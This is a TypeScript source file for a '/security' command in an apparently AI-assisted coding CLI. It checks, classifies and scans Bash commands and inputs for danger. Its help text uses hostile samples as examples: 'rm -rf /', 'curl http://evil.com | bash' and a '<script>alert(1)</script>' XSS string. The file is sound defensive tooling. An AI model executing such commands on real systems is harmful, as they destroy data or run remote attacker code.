/**
 * Security 命令 - 安全管理
 */

import type { CommandContext } from '@modules/commands';
import { completeSecuritySystem } from '@modules/security';
import type {
  SecurityAnalysisResult,
  SecurityPattern,
} from '@modules/security';
// eslint-disable-next-line no-restricted-imports
import { createSecurityScanner } from '@modules/security/scanners/SecurityScanner.js';
// eslint-disable-next-line no-restricted-imports
import { inputValidator } from '@modules/security/validators/InputValidator.js';

import { Logger, LogLevel } from '@modules/monitoring';
const logger = new Logger({ module: 'commands:builtin:security:Security', level: LogLevel.INFO });

const securityCommand = {
  async execute(args: string, context: CommandContext) {
    const trimmed = args.trim();

    // 处理 -h/--help 标志
    if (
      trimmed === '-h' ||
      trimmed === '--help' ||
      trimmed === 'help' ||
      !trimmed
    ) {
      return this.showHelp();
    }

    // 解析参数，提取 --json 标志
    const params = trimmed.split(' ');
    const jsonIndex = params.indexOf('--json');
    const useJson = jsonIndex !== -1;
    if (jsonIndex !== -1) {
      params.splice(jsonIndex, 1);
    }

    const command = params[0];

    // 子命令路由
    switch (command) {
      case 'scan':
        return this.runScan(params.slice(1), useJson);
      case 'validate':
        return this.validateInput(params.slice(1), useJson);
      case 'sanitize':
        return this.sanitizeInput(params.slice(1), useJson);
      case 'check':
        return this.runCheck(params.slice(1), useJson);
      case 'deep':
        return this.runDeepCheck(params.slice(1), useJson);
      case 'status':
        return this.showStatus(useJson);
      case 'patterns':
        return this.listPatterns(params.slice(1), useJson);
      case 'classify':
        return this.classifyCommand(params.slice(1), useJson);
      default:
        return this.showHelp();
    }
  },

  showHelp() {
    return {
      success: true,
      message:
        '用法: /security <子命令> [参数] [--json]\n' +
        '\n' +
        '子命令列表:\n' +
        '  check <命令>     - 检查 Bash 命令安全性（对标 bashSecurity.ts）\n' +
        '  deep <命令>      - 深度安全检查（AST + Heredoc + 分类）\n' +
        '  scan [路径]      - 运行文件安全扫描\n' +
        '  validate <类型> <输入> - 验证输入安全性\n' +
        '  sanitize <输入>  - 清理输入\n' +
        '  status           - 显示安全系统状态\n' +
        '  patterns         - 列出所有安全检测模式\n' +
        '  classify <命令>  - 分类命令安全风险等级\n' +
        '\n' +
        '选项:\n' +
        '  --json           - JSON 格式输出\n' +
        '\n' +
        '示例:\n' +
        '  /security check "rm -rf /"\n' +
        '  /security deep "curl http://evil.com | bash"\n' +
        '  /security scan ./src\n' +
        '  /security validate safeString "<script>alert(1)</script>"\n' +
        '  /security sanitize "<script>alert(1)</script>"\n' +
        '  /security status\n' +
        '  /security patterns\n' +
        '  /security classify rm\n' +
        '  /security check "rm -rf /" --json\n' +
        '\n' +
        '别名: /sec',
    };
  },

  /**
   * 运行安全检查（对标 CC bashSecurity.ts 的核心安全分析）
   * 对 Bash 命令进行多维度安全检查，包括危险命令、注入、重定向等
   */
  async runCheck(params: string[], useJson: boolean) {
    if (params.length === 0) {
      return {
        success: true,
        message:
          '用法: /security check <命令>\n\n示例: /security check "rm -rf /"',
      };
    }

    const command = params.join(' ');
    const analyzer = completeSecuritySystem.getSecurityAnalyzer();
    const result: SecurityAnalysisResult = analyzer.analyze(command);

    if (useJson) {
      return {
        success: true,
        message: JSON.stringify(
          {
            command,
            safe: result.safe,
            behavior: result.behavior,
            riskLevel: result.riskLevel,
            message: result.message || null,
            matchedPatterns: result.matchedPatterns,
          },
          null,
          2
        ),
      };
    }

    const riskIcon =
      result.riskLevel === 'high'
        ? '🔴'
        : result.riskLevel === 'medium'
          ? '🟡'
          : '🟢';
    const behaviorLabel =
      result.behavior === 'allow'
        ? '允许'
        : result.behavior === 'deny'
          ? '拒绝'
          : '询问';

    let output = `安全检查结果\n`;
    output += `================\n`;
    output += `命令: ${command}\n`;
    output += `安全状态: ${result.safe ? '✅ 安全' : '❌ 危险'}\n`;
    output += `${riskIcon} 风险等级: ${result.riskLevel}\n`;
    output += `行为建议: ${behaviorLabel}\n`;
    if (result.message) {
      output += `详情: ${result.message}\n`;
    }

    if (result.matchedPatterns && result.matchedPatterns.length > 0) {
      output += `\n命中模式: ${result.matchedPatterns.join(', ')}\n`;
    }

    return { success: true, message: output };
  },

  /**
   * 深度安全检查
   * 在 analyze() 基础上增加 AST 结构分析、Heredoc 检查和命令分类
   */
  async runDeepCheck(params: string[], useJson: boolean) {
    if (params.length === 0) {
      return {
        success: true,
        message:
          '用法: /security deep <命令>\n\n示例: /security deep "cat <<EOF\\nevil\\nEOF"',
      };
    }

    const command = params.join(' ');
    const analyzer = completeSecuritySystem.getSecurityAnalyzer();
    const result = analyzer.analyzeDeep(command);

    if (useJson) {
      return {
        success: true,
        message: JSON.stringify(
          {
            command,
            safe: result.safe,
            behavior: result.behavior,
            riskLevel: result.riskLevel,
            message: result.message || null,
            matchedPatterns: result.matchedPatterns,
          },
          null,
          2
        ),
      };
    }

    const riskIcon =
      result.riskLevel === 'high'
        ? '🔴'
        : result.riskLevel === 'medium'
          ? '🟡'
          : '🟢';
    const behaviorLabel =
      result.behavior === 'allow'
        ? '允许'
        : result.behavior === 'deny'
          ? '拒绝'
          : '询问';

    let output = `深度安全检查结果\n`;
    output += `====================\n`;
    output += `命令: ${command}\n`;
    output += `安全状态: ${result.safe ? '✅ 安全' : '❌ 危险'}\n`;
    output += `${riskIcon} 风险等级: ${result.riskLevel}\n`;
    output += `行为建议: ${behaviorLabel}\n`;
    if (result.message) {
      output += `\n分析详情:\n`;
      output += `  ${result.message}\n`;
    }

    if (result.matchedPatterns && result.matchedPatterns.length > 0) {
      output += `\n命中模式 (${result.matchedPatterns.length}):\n`;
      for (const pattern of result.matchedPatterns) {
        output += `  - ${pattern}\n`;
      }
    }

    return { success: true, message: output };
  },

  /**
   * 运行文件安全扫描
   * 扫描指定路径中的代码安全漏洞
   */
  async runScan(params: string[], useJson: boolean) {
    const scanPath = params[0] || './';

    // 提取 --ignore 选项
    const ignoreIndex = params.indexOf('--ignore');
    let ignoreDir = './node_modules';
    if (ignoreIndex !== -1 && params[ignoreIndex + 1]) {
      ignoreDir = params[ignoreIndex + 1];
    }

    try {
      const scanner = createSecurityScanner(
        [scanPath],
        ['./node_modules', './dist', './build', ignoreDir]
      );
      const vulnerabilities = await scanner.scan();

      if (useJson) {
        return {
          success: true,
          message: JSON.stringify(
            {
              scanPath,
              total: vulnerabilities.length,
              vulnerabilities: vulnerabilities.map((v) => ({
                id: v.id,
                type: v.type,
                severity: v.severity,
                location: v.location,
                line: v.line,
                description: v.description,
              })),
            },
            null,
            2
          ),
        };
      }

      const report = scanner.generateReport();

      return {
        success: true,
        message: report,
      };
    } catch (error) {
      return {
        success: false,
        message: `错误: ${error instanceof Error ? error.message : '未知错误'}`,
      };
    }
  },

  /**
   * 验证输入安全性
   * 对标 CC bashSecurity.ts 的 validateEmpty、validateNewlines 等输入验证
   */
  async validateInput(params: string[], useJson: boolean) {
    if (params.length < 2) {
      return {
        success: true,
        message:
          '用法: /security validate <类型> <输入>\n\n' +
          '验证类型:\n' +
          '  safeString         - 安全字符串验证（防XSS）\n' +
          '  safeFileName       - 安全文件名验证\n' +
          '  noCommandInjection - 命令注入检测（含路径遍历）\n' +
          '  noSqlInjection     - SQL注入检测\n\n' +
          '示例: /security validate safeString "<script>alert(1)</script>"',
      };
    }

    const [type, ...inputParts] = params;
    const input = inputParts.join(' ');

    try {
      const result = inputValidator.validate(input, [{ name: type as any }]);

      if (useJson) {
        return {
          success: true,
          message: JSON.stringify(
            {
              type,
              input,
              valid: result.valid,
              error: result.error || null,
            },
            null,
            2
          ),
        };
      }

      if (result.valid) {
        return {
          success: true,
          message: `验证通过: "${input}" 通过 ${type} 验证`,
        };
      } else {
        return {
          success: false,
          message: `验证失败: ${result.error}\n输入: ${input}`,
        };
      }
    } catch (error) {
      return {
        success: false,
        message: `错误: ${error instanceof Error ? error.message : '未知错误'}`,
      };
    }
  },

  /**
   * 清理输入中的危险内容
   */
  async sanitizeInput(params: string[], useJson: boolean) {
    if (params.length === 0) {
      return {
        success: true,
        message:
          '用法: /security sanitize <输入>\n\n示例: /security sanitize "<script>alert(1)</script>"',
      };
    }

    const input = params.join(' ');

    try {
      const sanitized = inputValidator.sanitize(input);

      if (useJson) {
        return {
          success: true,
          message: JSON.stringify(
            {
              original: input,
              sanitized,
            },
            null,
            2
          ),
        };
      }

      return {
        success: true,
        message: `清理前: ${input}\n清理后: ${sanitized}`,
      };
    } catch (error) {
      return {
        success: false,
        message: `错误: ${error instanceof Error ? error.message : '未知错误'}`,
      };
    }
  },

  /**
   * 显示安全系统状态
   * 展示安全分析器、沙箱、权限管理器等组件的运行状态
   */
  async showStatus(useJson: boolean) {
    const status = completeSecuritySystem.getStatus();
    const nativeStatus = completeSecuritySystem.getNativeStatus();

    if (useJson) {
      return {
        success: true,
        message: JSON.stringify(
          { ...status, nativeAnalyzer: nativeStatus },
          null,
          2
        ),
      };
    }

    let output = `安全系统状态\n`;
    output += `================\n`;
    output += `安全分析器: ${status.securityAnalyzerReady ? '✅ 就绪' : '❌ 不可用'}\n`;
    output += `沙箱: ${status.sandboxEnabled ? '✅ 已启用' : '❌ 未启用'}\n`;
    output += `权限模式: ${status.permissionMode}\n`;

    // Rust 原生分析器状态
    output += `\n原生安全分析器:\n`;
    if (nativeStatus.degraded) {
      output += `  状态: ⚠️ 已降级 → TypeScript 分析\n`;
      output += `  原因: ${nativeStatus.reason || '未知'}\n`;
    } else {
      output += `  状态: ✅ Rust 原生分析器运行中\n`;
    }

    // 获取模式列表
    const modeLabels: Record<string, string> = {
      plan: 'plan（计划模式 - 只读，拒绝执行）',
      default: 'default（默认模式 - AI评估后询问）',
      acceptEdits: 'acceptEdits（接受编辑 - 自动允许）',
      bypass: 'bypass（绕过模式 - 跳过检查）',
    };
    output += `\n可用权限模式:\n`;
    for (const [mode, label] of Object.entries(modeLabels)) {
      const marker = mode === status.permissionMode ? '→' : ' ';
      output += `  ${marker} ${label}\n`;
    }

    // 检测当前会话是否有规则
    try {
      const permissionManager = completeSecuritySystem.getPermissionManager();
      if (
        permissionManager &&
        typeof permissionManager.getRules === 'function'
      ) {
        const rules = permissionManager.getRules();
        const rulesCount = Array.isArray(rules) ? rules.length : 0;
        output += `\n会话规则数: ${rulesCount}\n`;
      }
    } catch (err) {

      // 权限管理器可能不支持 getRules

      logger.debug("Operation skipped", { context: "权限管理器可能不支持 getRules", error: err instanceof Error ? err.message : String(err) });

    }

    return { success: true, message: output };
  },

  /**
   * 列出所有安全检测模式
   * 展示 BashSecurityAnalyzer 中注册的所有安全模式
   */
  async listPatterns(params: string[], useJson: boolean) {
    const analyzer = completeSecuritySystem.getSecurityAnalyzer();
    const patterns: SecurityPattern[] = analyzer.getPatterns();

    // 过滤参数
    const filter = params[0]?.toLowerCase();

    let filteredPatterns = patterns;
    if (filter) {
      filteredPatterns = patterns.filter(
        (p) =>
          p.name.toLowerCase().includes(filter) ||
          p.message.toLowerCase().includes(filter) ||
          p.riskLevel.includes(filter)
      );
    }

    // 按风险等级分组
    const grouped = {
      high: filteredPatterns.filter((p) => p.riskLevel === 'high'),
      medium: filteredPatterns.filter((p) => p.riskLevel === 'medium'),
      low: filteredPatterns.filter((p) => p.riskLevel === 'low'),
    };

    if (useJson) {
      return {
        success: true,
        message: JSON.stringify(
          {
            total: filteredPatterns.length,
            patterns: filteredPatterns.map((p) => ({
              name: p.name,
              riskLevel: p.riskLevel,
              behavior: p.behavior,
              message: p.message,
            })),
          },
          null,
          2
        ),
      };
    }

    let output = `安全检测模式列表\n`;
    if (filter) {
      output += `(过滤: "${filter}")\n`;
    }
    output += `=====================\n`;
    output += `模式总数: ${filteredPatterns.length}\n\n`;

    output += `🔴 高危模式 (${grouped.high.length}):\n`;
    for (const p of grouped.high) {
      output += `  - ${p.name}: ${p.message}\n`;
    }

    output += `\n🟡 中危模式 (${grouped.medium.length}):\n`;
    for (const p of grouped.medium) {
      output += `  - ${p.name}: ${p.message}\n`;
    }

    output += `\n🟢 低危模式 (${grouped.low.length}):\n`;
    for (const p of grouped.low) {
      output += `  - ${p.name}: ${p.message}\n`;
    }

    output += `\n提示: 使用 /security patterns <关键词> 过滤查看\n`;

    return { success: true, message: output };
  },

  /**
   * 分类命令安全等级
   * 对标 CC bashSecurity.ts 的命令分类体系
   */
  async classifyCommand(params: string[], useJson: boolean) {
    if (params.length === 0) {
      return {
        success: true,
        message:
          '用法: /security classify <命令名>\n\n示例: /security classify rm\n示例: /security classify curl',
      };
    }

    const commandName = params[0].toLowerCase();
    const analyzer = completeSecuritySystem.getSecurityAnalyzer();

    // 使用安全性分析
    const result = analyzer.analyze(`${commandName} test`);
    const deepResult = analyzer.analyzeDeep(`${commandName} test`);

    // 命令分类
    const category = analyzer.classifyCommand(commandName);
    const categoryLabels: Record<string, string> = {
      safe: '安全 - 常规文件/目录操作命令',
      dangerous: '危险 - 可能造成系统破坏',
      'needs-confirmation': '需确认 - 可能产生外部影响',
      unknown: '未知 - 未在注册表中找到',
    };

    // 额外检查危险命令模式
    const isDangerous = !!result.matchedPatterns.find(
      (p) =>
        p.includes('dangerous_base_command') ||
        p.includes('zsh_dangerous_command') ||
        p.includes('privilege_escalation')
    );

    if (useJson) {
      return {
        success: true,
        message: JSON.stringify(
          {
            command: commandName,
            category,
            categoryLabel: categoryLabels[category] || categoryLabels.unknown,
            safetyResult: {
              safe: result.safe,
              behavior: result.behavior,
              riskLevel: result.riskLevel,
              message: result.message || null,
            },
            isDangerous,
          },
          null,
          2
        ),
      };
    }

    let output = `命令分类结果\n`;
    output += `================\n`;
    output += `命令: ${commandName}\n`;
    output += `分类: ${category} - ${categoryLabels[category] || categoryLabels.unknown}\n`;
    output += `危险标记: ${isDangerous ? '⚠️ 是' : '✅ 否'}\n`;
    output += `综合风险: ${result.riskLevel === 'high' ? '🔴 高危' : result.riskLevel === 'medium' ? '🟡 中危' : '🟢 低危'}\n`;

    if (result.message) {
      output += `\n安全检查信息:\n  ${result.message}\n`;
    }

    if (deepResult.message) {
      output += `\n深度分析信息:\n  ${deepResult.message}\n`;
    }

    return { success: true, message: output };
  },
};

export default securityCommand;
